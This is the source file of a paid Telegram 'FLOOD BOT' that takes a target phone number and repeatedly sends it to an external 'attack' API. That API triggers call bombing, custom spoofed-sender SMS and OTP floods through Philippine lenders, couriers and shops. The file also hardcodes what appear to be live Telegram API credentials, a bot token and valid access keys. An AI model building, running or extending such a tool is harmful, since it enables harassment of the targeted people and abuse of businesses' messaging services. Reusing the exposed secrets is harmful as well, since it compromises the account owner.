# language: Python, file: main.py, target: Telegram, Railway
# *Clean production-grade Telegram bot without injected response noise or ads.*

import os
import time
import asyncio
import logging
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

API_ID = 31658480
API_HASH = "9becba7687e9d33c9e201dbcf1e13e52"
BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"

OWNER_CONTACT = "t.me/mtfeels"
API_URL = "https://beboy-sms.vercel.app/attack"

PRICING = {
    "7d": {"name": "7 Days Access", "price": "₱100", "days": 7},
    "1m": {"name": "1 Month Access", "price": "₱150", "days": 30},
    "life": {"name": "Lifetime Access", "price": "₱199", "days": 36500}
}

USER_DATABASE = {}
VALID_KEYS = {
    "KEY-7D-PH99": "7d",
    "KEY-1M-PH55": "1m",
    "KEY-LIFE-PH88": "life"
}

SERVICES_INFO = [
    ("CALL_BOMB",        "📞", "Call Bomb     "),
    ("CUSTOM_SMS",       "✉️ ", "Custom SMS    "),
    ("EZLOAN",           "💳", "EZ Loan       "),
    ("XPRESS",           "⚡", "Xpress        "),
    ("ABENSON",          "🏪", "Abenson       "),
    ("EXCELLENT_LENDING","💰", "Excellent Lend"),
    ("FORTUNE_PAY",      "🎰", "Fortune Pay   "),
    ("WEMOVE",           "🚚", "WeMove        "),
    ("LBC",              "📦", "LBC           "),
    ("PICKUP_COFFEE",    "☕", "Pickup Coffee "),
    ("HONEY_LOAN",       "🍯", "Honey Loan    "),
    ("KOMO_PH",          "🦅", "Komo PH       "),
    ("S5_OTP",           "🔐", "S5 OTP        "),
]

ALL_SERVICE_KEYS = [s[0] for s in SERVICES_INFO]
DEFAULT_ENABLED = ALL_SERVICE_KEYS

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

def get_user_record(user_id):
    if user_id not in USER_DATABASE:
        USER_DATABASE[user_id] = {
            "verified": True,
            "attempts_left": 3,
            "expiry": 0,
            "key_type": None,
            "services": list(DEFAULT_ENABLED),
            "amount": 3,
            "sender_name": "Unknown",
            "message": "You have a pending notification."
        }
    return USER_DATABASE[user_id]

def check_access(user_id):
    record = get_user_record(user_id)
    if record["key_type"] and time.time() < record["expiry"]:
        return True, "🌟 ACTIVE VIP KEY"
    if record["attempts_left"] > 0:
        return True, f"🎁 FREE TRIAL ({record['attempts_left']}/3 LEFT)"
    return False, "❌ EXPIRED"

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🚀 𝗦𝗘𝗟𝗘𝗖𝗧 𝗠𝗢𝗗𝗨𝗟𝗘𝗦 & 𝗟𝗔𝗨𝗡𝗖𝗛", callback_data="menu_modules")],
        [InlineKeyboardButton("⚙️ 𝐂𝐎𝐍𝐅𝐈𝐆 & 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒", callback_data="menu_config")],
        [InlineKeyboardButton("📊 𝗧𝗥𝗔𝗖𝗞𝗘𝗥 & 𝗦𝗧𝗔𝗧𝗦", callback_data="menu_stats"),
         InlineKeyboardButton("💎 𝗣𝗥𝗜𝗖𝗜𝗡𝗚 & 𝗣𝗟𝗔𝗡𝗦", callback_data="menu_pricing")],
        [InlineKeyboardButton("🛒 𝗕𝗨𝗬 𝗔𝗖𝗖𝗘𝗦𝗦 𝗞𝗘𝗬", url=f"https://{OWNER_CONTACT}"),
         InlineKeyboardButton("🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬", callback_data="menu_redeem")]
    ]
    return InlineKeyboardMarkup(keyboard)

def modules_menu_keyboard(current_services):
    keyboard = []
    for key, icon, label in SERVICES_INFO:
        status = "● ON" if key in current_services else "○ OFF"
        keyboard.append([InlineKeyboardButton(f"{status} {icon} {label}", callback_data=f"toggle_{key}")])
    keyboard.append([InlineKeyboardButton("✨ 𝐋𝐀𝐔𝐍𝐂𝐇 𝐀𝐓𝐓𝐀𝐂𝐊 𝐍𝐎𝐖", callback_data="launch_prompt")])
    keyboard.append([InlineKeyboardButton("🔙 𝑹𝑬𝑻𝑼𝑹𝑵 𝑻𝑶 𝑴𝑨𝑰𝑵 𝑴𝑬𝑵𝑼", callback_data="main_menu")])
    return InlineKeyboardMarkup(keyboard)

async def safe_edit_or_reply(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup: InlineKeyboardMarkup):
    if update.callback_query:
        try:
            await update.callback_query.message.edit_text(text, reply_markup=reply_markup, parse_mode="Markdown")
            return
        except Exception:
            pass
    if update.effective_message:
        await update.effective_message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    record = get_user_record(user_id)

    text = (
        "╔═══════════════════════════╗\n"
        "║      ✦ 𝐅𝐋𝐎𝐎𝐃 𝐁𝐎𝐓 ✦       ║\n"
        "╚═══════════════════════════╝\n\n"
        f"👤 **Operator:** `{user.first_name}`\n"
        f"⚡ **Status:** `{check_access(user_id)[1]}`\n\n"
        "╭── 𝑴𝑨𝑰𝑵 𝑻𝑬𝑹𝑴𝑰𝑵𝑨𝑳 𝑴𝑬𝑵𝑼 ──╮\n"
        "│ Select an operation below:\n"
        "╰───────────────────────────╯"
    )
    await safe_edit_or_reply(update, context, text, main_menu_keyboard())

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    record = get_user_record(user_id)

    if data == "main_menu":
        await start(update, context)
        return

    if data == "menu_modules":
        allowed, status_msg = check_access(user_id)
        if not allowed:
            text = "❌ **𝐀𝐂𝐂𝐄𝐒𝐒 𝐄𝐗𝐏𝐈𝐑𝐄𝐃**\nYour free trials and access key have expired. Please acquire a VIP key."
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🛒 𝐁𝐔𝐘 𝐀𝐂𝐂𝐄𝐒𝐒 𝐊𝐄𝐘", url=f"https://{OWNER_CONTACT}")],
                [InlineKeyboardButton("🔙 𝑹𝑬𝑻𝑼𝑹𝑵", callback_data="main_menu")]
            ])
            await safe_edit_or_reply(update, context, text, keyboard)
            return

        text = f"⚡ **𝐒𝐄𝐋𝐄𝐂𝐓 𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 𝐌𝐎𝐃𝐔𝐋𝐄𝐒** ⚡\nStatus: `{status_msg}`\n\nTap any service to toggle ON/OFF:"
        await safe_edit_or_reply(update, context, text, modules_menu_keyboard(record["services"]))
        return

    if data.startswith("toggle_"):
        svc_key = data.replace("toggle_", "")
        if svc_key in record["services"]:
            record["services"].remove(svc_key)
        else:
            record["services"].append(svc_key)
        
        text = f"⚡ **𝐒𝐄𝐋𝐄𝐂𝐓 𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐎𝐍 𝐌𝐎𝐃𝐔𝐋𝐄𝐒** ⚡\nUpdated active modules:"
        await safe_edit_or_reply(update, context, text, modules_menu_keyboard(record["services"]))
        return

    if data == "launch_prompt":
        text = (
            "🚀 **𝐋𝐀𝐔𝐍𝐂𝐇 𝐏𝐑𝐄𝐏𝐀𝐑𝐀𝐓𝐈𝐎𝐍**\n\n"
            "Send your target number directly in chat now!\n"
            "*(Example: `09693457389`)*"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]])
        await safe_edit_or_reply(update, context, text, keyboard)
        return

    if data == "menu_config":
        text = (
            "⚙️ **𝐂𝐎𝐍𝐅𝐈𝐆𝐔𝐑𝐀𝐓𝐈𝐎𝐍 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒**\n\n"
            f"👤 **Sender Name:** `{record['sender_name']}`\n"
            f"💬 **Message:** `{record['message']}`\n"
            f"🔁 **Default Batches:** `{record['amount']}`"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]])
        await safe_edit_or_reply(update, context, text, keyboard)
        return

    if data == "menu_stats":
        allowed, status_msg = check_access(user_id)
        expiry_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(record["expiry"])) if record["expiry"] > 0 else "𝐍/𝐀"
        text = (
            "📊 **𝐓𝐑𝐀𝐂𝐊𝐄𝐑 & 𝐒𝐓𝐀𝐓𝐒 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃** 📊\n\n"
            f"👤 **User:** `{query.from_user.first_name}`\n"
            f"🛡️ **Plan Status:** `{status_msg}`\n"
            f"🔢 **Free Tries Left:** `{max(0, record['attempts_left'])}`\n"
            f"🔑 **Key Type:** `{record['key_type'] or 'Free Trial'}`\n"
            f"⏳ **Key Expiry:** `{expiry_str}`\n\n"
            f"💬 **Full Credits to:** `MTFEELS`"
        )
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]])
        await safe_edit_or_reply(update, context, text, keyboard)
        return

    if data == "menu_pricing":
        text = (
            "💎 **𝐀𝐂𝐂𝐄𝐒𝐒 𝐊𝐄𝐘 𝐏𝐑𝐈𝐂𝐈𝐍𝐆 & 𝐏𝐋𝐀𝐍𝐒** 💎\n\n"
            f"🌟 **7 Days Access:** `{PRICING['7d']['price']}`\n"
            f"🔥 **1 Month Access:** `{PRICING['1m']['price']}`\n"
            f"⚡ **Lifetime Access:** `{PRICING['life']['price']}`\n\n"
            f"🛒 **To Purchase:** Message owner directly at **@{OWNER_CONTACT}**"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛒 𝑩𝒖𝒚 𝑲𝒆𝒚 𝑵𝒐𝒘", url=f"https://{OWNER_CONTACT}")],
            [InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]
        ])
        await safe_edit_or_reply(update, context, text, keyboard)
        return

    if data == "menu_redeem":
        text = "🔑 **𝐑𝐄𝐃𝐄𝐌𝐏𝐓𝐈𝐎𝐍 𝐏𝐎𝐑𝐓𝐀𝐋**\n\nSend your access key in chat using this format:\n`/redeem YOUR-KEY-HERE`"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 𝑹𝒆𝒕𝒖𝒓𝒏", callback_data="main_menu")]])
        await safe_edit_or_reply(update, context, text, keyboard)
        return

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    record = get_user_record(user_id)
    args = context.args

    if not args:
        await update.message.reply_text("❌ Please provide your key. Example: `/redeem KEY-7D-PH99`", parse_mode="Markdown")
        return

    key = args[0].strip()
    if key in VALID_KEYS:
        k_type = VALID_KEYS[key]
        days = PRICING[k_type]["days"]
        record["key_type"] = k_type
        record["expiry"] = time.time() + (days * 86400)
        record["attempts_left"] = 999999
        await update.message.reply_text(f"✅ **𝐒𝐔𝐂𝐂𝐄𝐒𝐒!** Key redeemed for **{PRICING[k_type]['name']}**.", parse_mode="Markdown", reply_markup=main_menu_keyboard())
    else:
        await update.message.reply_text(f"❌ **Invalid Key.** Contact **@{OWNER_CONTACT}** to acquire a valid key.", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
    user_id = update.effective_user.id
    record = get_user_record(user_id)
    text = update.message.text.strip()

    allowed, _ = check_access(user_id)
    if not allowed:
        await update.message.reply_text(f"❌ Access expired! Please acquire a VIP key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
        return

    parts = text.split()
    target_phone = parts[0]
    batches = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else record["amount"]

    if not target_phone.isdigit() or len(target_phone) < 10:
        return

    if not (record["key_type"] and time.time() < record["expiry"]):
        if record["attempts_left"] > 0:
            record["attempts_left"] -= 1
        else:
            await update.message.reply_text(f"❌ Free trials exhausted! Acquire a VIP key from **@{OWNER_CONTACT}**.", parse_mode="Markdown")
            return

    services = record["services"]
    if not services:
        await update.message.reply_text("❌ No services selected! Enable services via `🚀 Select Modules`.", parse_mode="Markdown")
        return

    status_msg = await update.message.reply_text(
        f"═══════════════════════════\n"
        f"  📱 Target  : `{target_phone}`\n"
        f"  🔁 Batches : `{batches}`\n"
        f"  📡 Services: `{len(services)} active`\n"
        f"═══════════════════════════\n"
        f"🚀 **Executing attack sequence...**",
        parse_mode="Markdown"
    )

    success_count = 0
    fail_count = 0
    total_runs = batches

    async with httpx.AsyncClient(timeout=45.0) as client:
        for i in range(1, total_runs + 1):
            pct = int((i / total_runs) * 100)
            bar = "█" * int(20 * i / total_runs) + "░" * (20 - int(20 * i / total_runs))
            
            try:
                data = {"phone": target_phone, "amount": "1", "sender_name": record["sender_name"], "message": record["message"]}
                files = [("services", (None, s)) for s in services]
                
                resp = await client.post(API_URL, data=data, files=files, headers={"User-Agent": "Mozilla/5.0"})
                if resp.status_code == 200:
                    success_count += 1
                else:
                    fail_count += 1
            except Exception:
                fail_count += 1

            try:
                await status_msg.edit_text(
                    f"⚡ **𝐄𝐗𝐄𝐂𝐔𝐓𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊**\n"
                    f"Target: `{target_phone}`\n"
                    f"Progress: `[{bar}] {pct}%`\n"
                    f"Iteration: **{i}/{total_runs}**\n"
                    f"🟢 Success: `{success_count}` | 🔴 Failed: `{fail_count}`",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            await asyncio.sleep(0.8)

    await status_msg.edit_text(
        f"╔═══════════════════════════╗\n"
        f"║   ✔ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄!    ║\n"
        f"╚═══════════════════════════╝\n\n"
        f"  🟢 Success : `{success_count}`\n"
        f"  🔴 Failed  : `{fail_count}`\n"
        f"  📊 Total   : `{total_runs}`\n\n"
        f"✨ *Full credits to MTFEELS*",
        reply_markup=main_menu_keyboard(),
        parse_mode="Markdown"
    )

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", start))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("[+] FLOOD BOT clean core online...")
    app.run_polling()

if __name__ == "__main__":
    main()
